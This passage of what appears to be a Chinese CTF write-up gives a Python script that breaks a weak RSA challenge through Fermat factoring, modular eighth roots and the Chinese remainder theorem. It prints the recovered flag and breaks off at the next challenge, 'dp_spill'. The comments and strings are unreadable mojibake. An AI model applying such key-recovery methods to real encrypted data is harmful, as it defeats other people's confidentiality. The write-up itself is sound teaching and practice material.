</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">search_range</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">current_x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">y_sq</span> <span class="o">=</span> <span class="n">current_x</span> <span class="o">*</span> <span class="n">current_x</span> <span class="o">-</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">y_sq</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">y_sq</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">y</span> <span class="o">*</span> <span class="n">y</span> <span class="o">==</span> <span class="n">y_sq</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">current_x</span> <span class="o">-</span> <span class="n">y</span>
</span></span><span class="line"><span class="cl">            <span class="n">q</span> <span class="o">=</span> <span class="n">current_x</span> <span class="o">+</span> <span class="n">y</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">p</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">q</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;åˆ†è§£æˆåŠŸï¼åœ¨ i = </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> æ—¶æ‰¾åˆ°å› å­&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">100000</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>  <span class="c1"># æ¯10ä¸‡æ¬¡è¾“å‡ºè¿›åº¦</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;å·²å°è¯• </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> æ¬¡...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_prime</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;ç®€å•çš„ Miller-Rabin ç´ æ€§æµ‹è¯•&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># å°† n-1 å†™æˆ d*2^r</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="p">,</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">d</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">d</span> <span class="o">//=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">x</span> <span class="o">==</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">r</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">x</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="mi">2</span>  <span class="c1"># ç®€å•èµ·è§ï¼Œåªç”¨åŸº2æµ‹è¯•</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">check</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sqrt_mod_prime</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    åœ¨æ¨¡ç´ æ•°pä¸‹è®¡ç®—å¹³æ–¹æ ¹ï¼Œp â‰¡ 3 (mod 4)
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">p</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">root</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">4</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="n">root</span><span class="p">,</span> <span class="n">p</span> <span class="o">-</span> <span class="n">root</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_all_roots</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    åœ¨æ¨¡pä¸‹æ‰¾åˆ°æ‰€æœ‰æ»¡è¶³ x^e â‰¡ c (mod p) çš„æ ¹
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">e</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="n">c</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">roots</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">e</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">sqrt_mod_prime</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># é€’å½’åˆ†è§£ e</span>
</span></span><span class="line"><span class="cl">    <span class="n">prev_roots</span> <span class="o">=</span> <span class="n">find_all_roots</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">e</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">prev_roots</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_roots</span> <span class="o">=</span> <span class="n">sqrt_mod_prime</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">roots</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">new_roots</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">roots</span><span class="p">))</span>  <span class="c1"># å»é‡</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mod_inverse</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ±‚æ¨¡é€†å…ƒ&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">extended_gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">a</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">gcd</span><span class="p">,</span> <span class="n">x1</span><span class="p">,</span> <span class="n">y1</span> <span class="o">=</span> <span class="n">extended_gcd</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">a</span> <span class="o">%</span> <span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="n">y1</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="n">x1</span> <span class="o">-</span> <span class="p">(</span><span class="n">a</span> <span class="o">//</span> <span class="n">b</span><span class="p">)</span> <span class="o">*</span> <span class="n">y1</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">gcd</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">gcd</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">extended_gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">gcd</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;æ¨¡é€†å…ƒä¸å­˜åœ¨&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">chinese_remainder_theorem</span><span class="p">(</span><span class="n">remainders</span><span class="p">,</span> <span class="n">moduli</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;ä¸­å›½å‰©ä½™å®šç†&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">M</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">moduli</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">M</span> <span class="o">*=</span> <span class="n">m</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">m</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">remainders</span><span class="p">,</span> <span class="n">moduli</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">Mi</span> <span class="o">=</span> <span class="n">M</span> <span class="o">//</span> <span class="n">m</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="n">a</span> <span class="o">*</span> <span class="n">mod_inverse</span><span class="p">(</span><span class="n">Mi</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span> <span class="o">*</span> <span class="n">Mi</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span> <span class="o">%</span> <span class="n">M</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ç»™å®šæ•°æ®</span>
</span></span><span class="line"><span class="cl">    <span class="n">C</span> <span class="o">=</span> <span class="mi">451731346880007131332999430306985234187530419447859396067624968918101700861978676040615622417464916959678829732066195225132545956101693588984833424213755513877236702139360270137668415610295492436471366218119012903840729628449361663941761372974624789549775182866112541811446267811259781269568865266459437049508062916974638523947634702667929562107001830919422408810565410106056693018550877651160930860996772712877149329227066558481842344525735406568814917991752005</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="mi">491917847075013900815069309520768928274976990404751846981543204333198666419468384809286945880906855848713238459489821614928060098982194326560178675579884014989600009897895019721278191710357177079087876324831068589971763176646200619528739550876421709762258644696629617862167991346900122049024287039400659899610706153110527311944790794239992462632602379626260229348762760395449238458507745619804388510205772573967935937419407673995019892908904432789586779953769907</span>
</span></span><span class="line"><span class="cl">    <span class="n">hint</span> <span class="o">=</span> <span class="mi">66035251530240295423188999524554429498804416520951289016547753908652377333150838269168825344004730830028024338415783274479674378412532765763584271087554367024433779628323692638506285635583547190049386810983085033061336995321777237180762044362497604095831885258146390576684671783882528186837336673907983527353</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=== æ­¥éª¤1: è®¡ç®—r ===&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">hint</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;r = </span><span class="si">{</span><span class="n">r</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;r bit length: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;r % 4 = </span><span class="si">{</span><span class="n">r</span> <span class="o">%</span> <span class="mi">4</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== æ­¥éª¤2: åˆ†è§£hintå¾—åˆ°på’Œq ===&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">fermat_factor</span><span class="p">(</span><span class="n">hint</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">p</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;åˆ†è§£å¤±è´¥ï¼Œå°è¯•æ›´å¤§çš„æœç´¢èŒƒå›´&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;p = </span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;q = </span><span class="si">{</span><span class="n">q</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;éªŒè¯ p*q == hint: </span><span class="si">{</span><span class="n">p</span> <span class="o">*</span> <span class="n">q</span> <span class="o">==</span> <span class="n">hint</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;p % 4 = </span><span class="si">{</span><span class="n">p</span> <span class="o">%</span> <span class="mi">4</span><span class="si">}</span><span class="s2">, q % 4 = </span><span class="si">{</span><span class="n">q</span> <span class="o">%</span> <span class="mi">4</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;q - p = </span><span class="si">{</span><span class="n">q</span> <span class="o">-</span> <span class="n">p</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;2^400 = </span><span class="si">{</span><span class="mi">2</span><span class="o">**</span><span class="mi">400</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== æ­¥éª¤3: éªŒè¯n = p*q*r ===&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;éªŒè¯ n == p*q*r: </span><span class="si">{</span><span class="n">n</span> <span class="o">==</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span> <span class="o">*</span> <span class="n">r</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== æ­¥éª¤4: åœ¨p, q, rä¸‹åˆ†åˆ«æ±‚è§£m^8 â‰¡ C ===&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;åœ¨æ¨¡pä¸‹æ±‚è§£...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">roots_p</span> <span class="o">=</span> <span class="n">find_all_roots</span><span class="p">(</span><span class="n">C</span> <span class="o">%</span> <span class="n">p</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;åœ¨æ¨¡pä¸‹æ‰¾åˆ° </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">roots_p</span><span class="p">)</span><span class="si">}</span><span class="s2"> ä¸ªæ ¹&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;åœ¨æ¨¡qä¸‹æ±‚è§£...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">roots_q</span> <span class="o">=</span> <span class="n">find_all_roots</span><span class="p">(</span><span class="n">C</span> <span class="o">%</span> <span class="n">q</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;åœ¨æ¨¡qä¸‹æ‰¾åˆ° </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">roots_q</span><span class="p">)</span><span class="si">}</span><span class="s2"> ä¸ªæ ¹&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;åœ¨æ¨¡rä¸‹æ±‚è§£...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">roots_r</span> <span class="o">=</span> <span class="n">find_all_roots</span><span class="p">(</span><span class="n">C</span> <span class="o">%</span> <span class="n">r</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;åœ¨æ¨¡rä¸‹æ‰¾åˆ° </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">roots_r</span><span class="p">)</span><span class="si">}</span><span class="s2"> ä¸ªæ ¹&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== æ­¥éª¤5: å°è¯• </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">roots_p</span><span class="p">)</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">roots_q</span><span class="p">)</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">roots_r</span><span class="p">)</span><span class="si">}</span><span class="s2"> ç§ç»„åˆ ===&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">moduli</span> <span class="o">=</span> <span class="p">[</span><span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">r</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">mp</span><span class="p">,</span> <span class="n">mq</span><span class="p">,</span> <span class="n">mr</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">roots_p</span><span class="p">,</span> <span class="n">roots_q</span><span class="p">,</span> <span class="n">roots_r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">count</span> <span class="o">%</span> <span class="mi">100</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>  <span class="c1"># æ¯100æ¬¡è¾“å‡ºè¿›åº¦</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;å·²å°è¯• </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s2"> ç§ç»„åˆ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="c1"># ä¸­å›½å‰©ä½™å®šç†</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">x</span> <span class="o">=</span> <span class="n">chinese_remainder_theorem</span><span class="p">([</span><span class="n">mp</span><span class="p">,</span> <span class="n">mq</span><span class="p">,</span> <span class="n">mr</span><span class="p">],</span> <span class="n">moduli</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="c1"># æ£€æŸ¥æ˜¯å¦ä¸ºæœ‰æ•ˆæ˜æ–‡</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">flag_candidate</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># æ£€æŸ¥å¸¸è§çš„flagæ ¼å¼</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="sa">b</span><span class="s1">&#39;SYC&#39;</span> <span class="ow">in</span> <span class="n">flag_candidate</span> <span class="ow">or</span> 
</span></span><span class="line"><span class="cl">                    <span class="sa">b</span><span class="s1">&#39;ctf&#39;</span> <span class="ow">in</span> <span class="n">flag_candidate</span> <span class="ow">or</span> 
</span></span><span class="line"><span class="cl">                    <span class="sa">b</span><span class="s1">&#39;FLAG&#39;</span> <span class="ow">in</span> <span class="n">flag_candidate</span> <span class="ow">or</span>
</span></span><span class="line"><span class="cl">                    <span class="sa">b</span><span class="s1">&#39;{&#39;</span> <span class="ow">in</span> <span class="n">flag_candidate</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">ğŸ‰ æ‰¾åˆ°flag: </span><span class="si">{</span><span class="n">flag_candidate</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æœªæ‰¾åˆ°flagï¼Œå¯èƒ½éœ€è¦è°ƒæ•´æœç´¢æ¡ä»¶&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œå¯å¾—syc{th1s_so_1z_mum_never_ca1r_mytstu1d}#</p>
<h3 id="33dp_spill">33.dp_spill
</h3><p>è§£å¯†è„šæœ¬å¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
